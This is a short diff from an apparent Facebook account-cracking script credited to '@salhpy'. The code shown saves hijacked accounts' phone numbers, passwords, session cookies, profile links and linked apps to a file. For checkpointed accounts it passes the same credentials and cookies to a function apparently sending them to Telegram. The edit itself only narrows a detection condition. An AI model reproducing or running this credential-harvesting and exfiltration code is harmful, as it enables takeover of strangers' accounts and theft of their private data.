@@ -1359,7 +1359,7 @@ Developer • @salhpy
         with open(f"{folder}/salh_ok.txt", 'a', encoding='utf-8') as f:
         	f.write(f"{phone}|{pas}\nCookie: {cookie_string}\nLink: https://www.facebook.com/profile.php?id={idd}\nApps: {apps}|{dates}\nExpired: {apps2}|{dates2}\nBY: @salhpy\n{'-'*40}\n")
     
-    elif 'www.facebook.com' in response_str or 'uid' in response_str:
+    elif 'www.facebook.com' in response_str:
                 CP += 1
                 ssend_teleG(phone, pas, idd, cookie_string, apps, dates, apps2, dates2)
                 print(اعادة + f'{ازرق}CP ACCUONT {phone} | {pas} {اعادة}{ذهبي} ~ {اعادة}{ازرق} @salhpy')
